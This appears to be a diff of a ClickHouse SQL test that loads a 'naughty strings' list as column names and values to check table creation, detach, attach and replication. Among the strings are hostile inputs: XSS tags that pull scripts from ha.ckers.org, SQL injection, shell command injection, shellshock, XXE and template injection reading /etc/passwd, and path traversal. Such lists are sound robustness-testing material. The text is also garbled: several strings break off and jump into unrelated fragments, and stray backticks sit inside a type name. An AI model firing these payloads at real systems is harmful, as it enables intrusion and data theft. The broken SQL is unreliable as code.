+SELECT 'undefined','undef','null','NULL','(null)','nil','NIL','true','false','True','False','TRUE','FALSE','None','hasOwnProperty','then','\\','\\\\','0','1','1.00','$1.00','1/2','1E2','1E02','1E+02','-1','-1.00','-$1.00','-1/2','-1E2','-1E02','-1E+02','1/0','0/0','-2147483648/-1','-9223372036854775808/-1','-0','-0.0','+0','+0.0','0.00','0..0','.','0.0.0','0,00','0,,0',',','0,0,0','0.0/0','1.0/0.0','0.0/0.0','1,0/0,0','0,0/0,0','--1','-','-.','-,','999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999','NaN','Infinity','-Infinity','INF','1#INF','-1#IND','1#QNAN','1#SNAN','1#IND','0x0','0xffffffff','0xff����ffffffffff','0xabad1dea','123456789012345678901234567890123456789','1,000.00','1 000.00','1\'000.00','1,000,000.00','1 000 000.00','1\'000\'000.00','1.000,00','1 000,00','1\'000,00','1.000.000,00','1 000 000,00','1\'000\'000,00','01000','08','09','2.2250738585072011e-308',',./;\'[]\\-=','<>?:"{}|_+','!@#$%^&*()`~','\\u0001\\u0002\\u0003\\u0004\\u0005\\u0006\\u0007\b\\u000e\\u000f\\u0010\\u0011\\u0012\\u0013\\u0014\\u0015\\u0016\\u0017\\u0018\\u0019\\u001a\\u001b\\u001c\\u001d\\u001e\\u001f','','\t\\u000b\f              ​    　','­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿','﻿','￾','Ω≈ç√∫˜µ≤≥÷','åß∂ƒ©˙∆˚¬…æ','œ∑´®†¥¨ˆøπ“‘','¡™£¢∞§¶•ªº–≠','¸˛Ç◊ı˜Â¯˘¿','ÅÍÎÏ˝ÓÔÒÚÆ☃','Œ„´‰ˇÁ¨ˆØ∏”’','`⁄€‹›ﬁﬂ‡°�ЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя','٠١٢٣٤٥٦٧٨٩','⁰⁴⁵','₀₁₂','⁰⁴⁵₀₁₂','ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้�~��็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้� end up in your dream, but we hope it works. Please wake up, we miss you.','Roses are \\u001b[0;31mred\\u001b[0m, violets are \\u001b[0;34mblue. Hope you enjoy terminal hue','But now...\\u001b[20Cfor my greatest trick...\\u001b[8m','The quic\b\b\b\b\b\bk brown fo\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007\\u0007x... [Beeeep]','Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗','🏳0🌈️','జ్ఞ‌ా','گچپژ','{% print \'x\' * 64 * 1024**3 %}','{{ "".__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}' FORMAT PrettyCompactNoEscapes;
+
+SELECT JSONExtract(
+    '{"x": [\n  "", \n  "undefined", \n  "undef", \n  "null", \n  "NULL", \n  "(null)", \n  "nil", \n  "NIL", \n  "true", \n  "false", \n  "True", \n  "False", \n  "TRUE", \n  "FALSE", \n  "None", \n  "hasOwnProperty", \n  "then", \n  "\\\\", \n  "\\\\\\\\", \n  "0", \n  "1", \n  "1.00", \n  "$1.00", \n  "1mushrooms" String,
+  "RomansInSussex.co.uk" String,
+  "http://www.cum.qc.ca/" String,
+  "Craig Cockburn, Software Specialist" String,
+  "Linda Callahan" String,
+  "Dr. Herman I. Libshitz" String,
+  "magna cum laude" String,
+  "Super Bowl XXX" String,
+  "medieval erection of parapets" String,
+  "evaluate" String,
+  "mocha" String,
+  "expression" String,
+  "Arsenal canal" String,
+  "classic" String,
+  "Tyson Gay" String,
+  "Dick Van Dyke" String,
+  "basement" String,
+  "If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you." String,
+  "Roses are \u001b[0;31mred\u001b[0m, violets are \u001b[0;34mblue. Hope you enjoy terminal hue" String,
+  "But now...\u001b[20Cfor my greatest trick...\u001b[8m" String,
+  "The quic\b\b\b\b\b\bk brown fo\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007x... [Beeeep]" String,
+  "Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗" String,
+  "🏳0🌈️" String,
+  "జ్ఞ‌ా" String,
+  "گچپژ" String,
+  "{% print 'x' * 64 * 1024**3 %}" String,
+  "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" String
+) ENGINE = MergeTree ORDER BY "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" SETTINGS min_bytes_for_wide_part = '100G';
+
+INSERT INTO test ("0") SELECT '02681_undrop_distributed sy  
+select 'test MergeTree drop and undrop multiplHello, world!';
+SELECT count() FROM test;
+
+DETACH TABLE test;
+ATTACH TABLE test;
+
+SELECT count() FROM test;
+
+INSERT INTO test ("0") VALUES ('Hello, world!');
+SELECT count() FROM test;
+
+DROP TABLE IF EXISTS test_r1;
+DROP TABLE IF EXISTS test_r2;
+
+CREATE TABLE test_r1 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r1') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+INSERT INTO test_r1 SELECT * FROM test;
+CREATE TABLE test_r2 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r2') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+
+SYSTEM SYNC REPLICA test_r2;
+
+SELECT count() FROM test_r1;
+SELECT count() FROM test_r2;
+
+DROP TABLE test_r1;
+DROP TABLE test_r2;
+
+SELECT groupArray(name) FROM system.columns WHERE database = currentDatabase() AND table = 'test';
+
+DROP TABLE test;
+
+SELECT 'undefined','undef','null','NULL','(null)','nil','NIL','true','false','True','False','TRUE','FALSE','None','hasOwnProperty','then','\\','\\\\','0','1','1.00','$1.00','1/2','1E2','1E02','1E+02','-1','-1.00','-$1.00','-1/2','-1E2','-1E02','-1E+02','1/0','0/0','-2147483648/-1','-9223372036854775808/-1','-0','-0.0','+0','+0.0','0.00','0..0','.','0.0.0','0,00','0,,0',',','0,0,0','0.0/0','1.0/0.0','0.0/0.0','1,0/0,0','0,0/0,0','--1','-','-.','-,','999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999','NaN','Infinity','-Infinity','INF','1#INF','-1#IND','1#QNAN','1#SNAN','1#IND','0x0','0xffffffff','0xff����ffffffffff','0xabad1dea','123456789012345678901234567890123456789','1,000.00','1 000.00','1\'000.00','1,000,000.00','1 000 000.00','1\'000\'000.00','1.000,00','1 000,00','1\'000,00','1.000.000,00','1 000 000,00','1\'000\'000,00','01000','08','09','2.2250738585072011e-308',',./;\'[]\\-=','<>?:"{}|_+','!@#$%^&*()`~','\\u0001\\u0002\\u0003\\u0004\\u0005\\u0006\\u0007\b\\u000e\\u000f\\u0010\\u0011\\u0012\\u0013\\u0014\\u0015\\u0016\\u0017\\u0018\\u0019\\u001a\\u001b\\u001c\\u001d\\u001e\\u001f','','\t\\u000b\f              ​    　','­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿','﻿','￾','Ω≈ç√∫˜µ≤≥÷','åß∂ƒ©˙∆˚¬…æ','œ∑´®†¥¨ˆøπ“‘','¡™£¢∞§¶•ªº–≠','¸˛Ç◊ı˜Â¯˘¿','ÅÍÎÏ˝ÓÔÒÚÆ☃','Œ„´‰ˇÁ¨ˆØ∏”’','`⁄€‹›ﬁﬂ‡°�ЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя','٠١٢٣٤٥٦٧٨٩','⁰⁴⁵','₀₁₂','⁰⁴⁵₀₁₂','ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้�~��็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้� end up in your dream, but we hope it works. Please w000,00','1 000 000,00','1\'000\'000,00','01000','08','09','2.2250738585072011e-308',',./;\'[]\\-=','<>?:"{}|_+','!@#$%^&*()`~','\b','','\t\f              ​    　','­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿','﻿','￾','Ω≈ç√∫˜µ≤≥÷','åß∂ƒ©˙∆˚¬…æ','œ∑´®†¥¨ˆøπ“‘','¡™£¢∞§¶•ªº–≠','¸˛Ç◊ı˜Â¯˘¿','ÅÍÎÏ˝ÓÔÒÚÆ☃','Œ„´‰ˇÁ¨ˆØ∏”’','`⁄€‹›ﬁﬂ‡°·‚—±','⅛⅜⅝⅞','ЁЂЃЄЅІЇЈЉЊЋЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя','٠١٢٣٤٥٦٧٨٩','⁰⁴⁵','₀₁₂','⁰⁴⁵₀₁₂','ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็','\'','"','\'\'','""','\'"\'','"\'\'\'\'"\'"','"\'"\'"\'\'\'\'"','<foo val=“bar” />','<foo val=“bar” />','<foo val=”bar“ />','<foo val=`bar\' />','田中さんにあげて下さい','パーティーへ行かないか','和製漢語','部落格','사회과학원 어학연구소','찦차를 타고 온 펲시맨과 쑛다리 똠방각하','社會科學院語學研究所','울란바토르','𠜎𠜱𠝹𠱓𠱸𠲖𠳏','𐐜 𐐔𐐇𐐝𐐀𐐡𐐇𐐓 𐐙𐐊𐐡𐐝𐐓/𐐝𐐇𐐗𐐊𐐤𐐔 𐐒𐐋𐐗 𐐒𐐌 𐐜 𐐡𐐀𐐖�&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>','<IMG SRC="jav   ascript:alert(\'XSS\');">','<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">','<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">','<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">','perl -e \'print "<IMG SRC=java\\0script:alert(\\"XSS\\")>";\' > out','<IMG SRC=" &#14;  javascript:alert(\'XSS\');">','<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>','<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>','<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>','<<SCRIPT>alert("XSS");//<</SCRIPT>','<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >','<SCRIPT SRC=//ha.ckers.org/.j>','<IMG SRC="javascript:alert(\'XSS\')"','<iframe src=http://ha.ckers.org/scriptlet.html <','\\";alert(\'XSS\');//','<u oncopy=alert()> Copy me</u>','<i onwheel=alert(1)> Scroll over me </i>','<plaintext>','http://a/%%30%30','</textarea><script>alert(123)</script>','1;DROP TABLE users','1\'; DROP TABLE users-- 1','\' OR 1=1 -- 1','\' OR \'1\'=\'1','\'; EXEC sp_MSForEachTable \'DROP TABLE ?\'; --',' ','%','_','-','--','--version','--help','$USER','/dev/null; touch /tmp/blns.fail ; echo','`touch /tmp/blns.fail`','$(touch /tmp/blns.fail)','@{[system "touch /tmp/blns.fail"]}','eval("puts \'hello world\'")','System("ls -al /")','`ls -al /`','Kernel.exec("ls -al /")','Kernel.exit(1)','%x(\'ls -al /\')','<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>','$HOME','$ENV{\'HOME\'}','%d','%s%s%s%s%s','{0}','%*.*s','%@','%n','File:///','../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../etc/hosts','() { 0; }; touch /tmp/blns.shellshock1.fail;','() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }','<<< %s(un=\'%s\') = %u','+++ATH0','CON','PRN','AUX','CLOCK$','NUL','A:','ZZ:','COM1','LPT1','LPT2','LPT3','COM2','COM3','COM4','DCC SEND STARTKEYLOGGER 0 0 0','Scunthorpe General Hospital','Penistone Community Church','Lightwater Country Park','Jimmy Clitheroe','Horniman Museum','shitake mushrooms','RomansInSussex.co.uk','http://www.cum.qc.ca/','Craig Cockburn, Software Specialist','Linda Callahan','Dr. Herman I. Libshitz','magna دنو. إذ هنا؟ الستار وتنصيب كان. أهّل ايطاليا، بريطانيا-فرنسا قد أخذ. سليمان، إتفاقية بين ما , يذكر الحدود أي بعد, معاملة بولندا، الإطلاق عل إيو." String,
+  "בְּרֵאשִׁית, בָּרָא אֱלֹהִים, אֵת הַשָּׁמַיִם, וְאֵת הָאָרֶץ" String,
+  "הָיְתָהtestالصفحات التّحول" String,
+  "﷽" String,
+  "ﷺ" String,
+  "مُنَاقَشَةُ سُبُلِ اِسْتِخْدَامِ اللُّغَةِ فِي النُّظُمِ الْقَائِمَةِ وَفِيم يَخُصَّ التَّطْبِيقَاتُ الْحاسُوبِيَّةُ، " String,
+  "᚛ᚄᚓᚐᚋᚒᚄ ᚑᚄᚂᚑᚏᚅ᚜‪‪‪" String,
+  "‪‪᚛                 ᚜‪" String,
+  "‪‪test‪" String,
+  "‫test‫" String,
+  " test " String,
+  "test⁠test‫" String,
+  "⁦test⁧" String,
+  "Ṱ̺̺̕o͞ ̷i̲̬͇̪͙n̝̗͕v̟̜̘̦͟o̶̙̰̠kè͚̮̺̪̹̱̤ ̖t̝͕̳̣̻̪͞h̼͓̲̦̳̘̲e͇̣̰̦̬͎ ̢̼̻̱̘h͚͎͙̜̣̲ͅi̦̲̣̰̤v̻͍e̺̭̳̪̰-m̢iͅn̖̺̞̲̯̰d̵̼̟͙̩̼̘̳ ̞̥̱̳̭r̛̗̘e͙p͠r̼̞̻̭̗e̺̠̣͟s̘͇̳͍̝͉e͉̥̯̞̲͚̬͜ǹ̬͎͎̟̖͇̤t͍̬̤͓̼̭͘ͅi̪̱n͠g̴͉ ͏͉ͅc̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈̣" String,
+  "̡͓̞ͅI̗̘̦͝n͇͇͙v̮̫ok̲̫̙͈i̖͙̭̹̠̞n̡̻̮̣̺g̲͈͙̭͙̬͎ ̰t͔̦h̞̲e̢̤ ͍̬̲͖f̴̘͕̣è͖ẹ̥̩l͖͔͚i͓͚̦͠n͖͍̗͓̳̮g͍ ̨o͚̪͡f̘̣̬ ̖̘͖̟͙̮c҉͔̫͖͓͇͖ͅh̵̤̣͚͔á̗̼͕ͅo̼̣̥s̱͈̺̖̦̻͢.̛̖̞̠̫̰" String,
+  "̗̺͖̹̯͓Ṯ̤͍̥͇͈h̲́e͏͓̼̗̙̼̣͔ ͇̜̱̠͓͍ͅN͕͠e̗̱z̘̝̜̺͙p̤̺̹͍̯͚e̠̻̠͜r̨̤͍̺̖͔̖̖d̠̟̭̬̝͟i̦͖̩͓͔̤a̠̗̬͉̙n͚͜ ̻̞̰͚ͅh̵͉i̳̞v̢͇ḙ͎͟-҉̭̩̼͔m̤̭̫i͕͇̝̦n̗͙ḍ̟ ̯̲͕͞ǫ̟̯̰̲͙̻̝f ̪̰̰̗̖̭̘͘c̦͍̲̞͍̩̙ḥ͚a̮͎̟̙͜ơ̩̹͎s̤.̝̝ ҉Z̡̖̜͖̰̣͉̜a͖̰͙̬͡l̲̫̳͍̩g̡̟̼̱͚̞̬ͅo̗͜.̟" String,
+  "̦H̬̤̗̤͝e͜ ̜̥̝̻͍̟́w̕h̖̯͓o̝͙̖͎̱̮ ҉̺̙̞̟͈W̷̼̭a̺̪͍į͈͕̭͙̯̜t̶̼̮s̘͙͖̕ ̠̫̠B̻͍͙͉̳ͅe̵h̵̬͇̫͙i̹͓̳̳̮͎̫̕n͟d̴̪̜̖ ̰͉̩͇͙̲͞ͅT͖̼͓̪͢h͏͓̮̻e̬̝̟ͅ ̤̹̝W͙̞̝͔͇͝ͅa͏͓͔̹̼̣l̴͔̰̤̟͔ḽ̫.͕" String,
+  "Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮" String,
+  "˙ɐnbᴉlɐ ɐuƃɐɯ ǝɹolop ʇǝ ǝɹoqɐl ʇn ʇunpᴉpᴉɔuᴉ ɹodɯǝʇ poɯsnᴉǝ op pǝs 'ʇᴉlǝ ƃuᴉɔsᴉdᴉpɐ ɹnʇǝʇɔǝsuoɔ 'ʇǝɯɐ ʇᴉs ɹolop ɯnsdᴉ ɯǝɹo˥" String,
+  "00˙Ɩ$-" String,
+  "Ｔｈｅ ｑｕｉｃｋ ｂｒｏｗｎ ｆｏｘ ｊｕｍｐｓ ｏｖｅｒ ｔｈｅ ｌａｚｙ ｄｏｇ" String,
+  "𝐓𝐡𝐞 𝐪𝐮𝐢𝐜𝐤 𝐛𝐫𝐨𝐰𝐧 𝐟𝐨𝐱 𝐣𝐮𝐦𝐩𝐬 𝐨𝐯𝐞𝐫 𝐭𝐡𝐞 𝐥𝐚𝐳𝐲 𝐝𝐨𝐠" String,
+  "𝕿𝖍𝖊 𝖖𝖚𝖎𝖈𝖐 𝖇𝖗𝖔𝖜𝖓 𝖋𝖔𝖝 𝖏𝖚𝖒𝖕𝖘 𝖔𝖛𝖊𝖗 𝖙𝖍𝖊 𝖑𝖆𝖟𝖞 𝖉𝖔𝖌" String,
+  "𝑻𝒉𝒆 𝒒𝒖𝒊𝒄𝒌 𝒃𝒓𝒐�SS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" String,
+  "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>" String,
+  "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" String,
+  "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>" String,
+  "<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >" String,
+  "<SCRIPT SRC=//ha.ckers.org/.j>" String,
+  "<IMG SRC=\"javascript:alert('XSS')\"" String,
+  "<iframe src=http://ha.ckers.org/scriptlet.html <" String,
+  "\\\";alert('XSS');//" String,
+  "<u oncopy=alert()> Copy me</u>" String,
+  "<i onwheel=alert(1)> Scroll over me </i>" String,/  "<plaintext>" String,
+  "http://a/%%30%30" String,
+  "</textarea><script>alert(123)</script>" String,
+  "1;DROP TABLE users" String,
+  "1'; DROP TABLE users-- 1" String,
+  "' OR 1=1 -- 1" String,
+  "' OR '1'='1" String,
+  "'; EXEC sp_MSForEachTable 'DROP TABLE ?'; --" String,
+  " " String,
+  "%" String,
+  "_" String,
+  "--" String,
+  "--version" String,
+  "--help" String,
+  "$USER" String,
+  "/dev/null; touch /tmp/blns.fail ; echo" String,
+  "`touch /tmp/blns.fail`" String,
+  "$(touch /tmp/blns.fail)" String,
+  "@{[system \"touch /tmp/blns.fail\"]}" String,
+  "eval(\"puts 'hello world'\")" String,
+  "System(\"ls -al /\")" String,
+  "`ls -al /`" String,
+  "Kernel.exec(\"ls -al /\")" String,
+  "Kernel.exit(1)" String,
+  "%x('ls -al /')" String,
+  "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>" String,
+  "$HOME" String,
+  "$ENV{'HOME'}" String,
+  "%d" String,
+  "%s%s%s%s%s" String,
+  "{0}" String,
+  "%*.*s" String,
+  "%@" String,
+  "%n" String,
+  "File:///" String,
+  "../../../../../../../../../../../etc/passwd%00" String,
+  "../../../../../../../../../../../etc/hosts" String,
+  "() { 0; }; touch /tmp/blns.shellshock1.fail;" String,
+  "() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }" String,
+  "<<< %s(un='%s') = %u" String,
+  "+++ATH0" String,
+  "CON" Strin`````````````````````````````````````````````````````````````````````````````````````````````````````````g,
+  "PRN" String,
+  "AUX" String,
+  "CLOCK$" String,
+  "NUL" String,
+  "A:" String,
+  "ZZ:" String,
+  "COM1" String,
+  "LPT1" String,
+  "LPT2" String,
+  "LPT3" String,
+  "COM2" String,
+  "COM3" String,
+  "COM4" String,
+  "DCC SEND STARTKEYLOGGER 0 0 0" String,
+  "Scunthorpe General Hospital" String,
+  "Penistone Community Church" String,
+  "Lightwater Country Park" String,
+  "Jimmy Clitheroe" String,
+  "Horniman Museum" String,
+  "shitake mushrooms" String,
+  "RomansInSussex.co.uk" String,
+  "http://www.cum.qc.ca/" String,
+  "Craig Cockburn, Software Specialist" String,
+  "Linda Callahan" String,
+  "Dr. Herman I. Libshitz" String,
+  "magna cum laude" String,
+  "Super Bowl XXX" String,
+  "medieval erection of parapets" String,
+  "evaluate" String,
+  "mocha" String,
+  "expression" String,
+  "Arsenal canal" String,
+  "classic" String,
+  "Tyson Gay" String,
+  "Dick Van Dyke" String,
+  "basement" String,
+  "If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you." String,
+  "Roses are \u001b[0;31mred\u001b[0m, violets are \u001b[0;34mblue. Hope you enjoy terminal hue" String,
+  "But now...\u001b[20Cfor my greatest trick...\u001b[8m" String,
+  "The quic\b\b\b\b\b\bk brown fo\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007x... [Beeeep]" String,
+  "Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗" String,
+  "🏳0🌈️" String,
+  "జ్ఞ‌ా" String,
+  "گچپژ" String,
+  "{% print 'x' * 64 * 1024**3 %}" String,
+  "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" String
+) ENGINE = MergeTree ORDER BY "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" SETTINGS min_bytes_for_wide_part = '100G';
+
+INSERT INTO test ("0") SELECT 'Hello, world!';
+SELECT count() FROM test;
+
+DETACH TABLE test;
+ATTACH TABLE test;
+
+SELECT count() FROM test;
+
+INSERT INTO test ("0") VALUES ('Hello, world!');
+SELECT count() FROM test;
+
+DROP TABLE IF EXISTS test_r1;
+DROP TABLE IF EXISTS test_r2;
+
+CREATE TABLE test_r1 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r1') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+INSERT INTO test_r1 SELECT * FROM test;
+CREATE TABLE test_r2 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r2') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+
+SYSTEM SYNC REPLICA test_r2;
+
+SELECT count() FROM test_r1;
+SELECT count() FROM test_r2;
+
+DROP TABLE test_r1;
+DROP TABLE test_r2;
+
+SELECT groupArray(name) FROM system.columns WHERE database = currentDatabase() AND table = 'test';
+
+DROP TABLE test;
+
+SELECT 'undefined','undef','null','NULL','(null)','nil','NIL','true','false','True','False','TRUE','FALSE','None','hasOwnProperty','then','\\','\\\\','0','1','1.00','$1.00','1/2','1E2','1E02','1E+02','-1','-1.00','-$1.00','-1/2','-1E2','-1E02','-1E+02','1/0','0/0','-2147483648/-1','-9223372036854775808/-1','-0','-0.0','+0','+0.0','0.00','0..0','.','0.0.0','0,00','0,,0',',','0,0,0','0.0/0','1.0/0.0','0.0/0.0','1,0/0,0','0,0/0,0','--1','-','-.','-,','999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999','NaN','Infinity','-Infinity','INF','1#INF','-1#IND','1#QNAN','1#SNAN','1#IND','0x0','0xffffffff','0xff����ffffffffff','0xabad1dea','123456789012345678901234567890123456789','1,000.00','1 000.00','1\'000.00','1,000,000.00','1 000 000.00','1\'000\'000.00','1.000,00','1 000,00','1\'000,00','1.000.000,00','1 000 000,00','1\'000\'000,00','01000','08','09','2.2250738585072011e-308',',./;\'[]\\-=','<>?:"{}|_+','!@#$%^&*()`~','\\u0001\\u0002\\u0003\\u0004\\u0005\\u0006\\u0007\b\\u000e\\u000f\\u0010\\u0011\\u0012\\u0013\\u0014\\u0015\\u0016\\u0017\\u0018\\u0019\\u001a\\u001b\\u001c\\u001d\\u001e\\u001f','','\t\\u000b\f              ​    　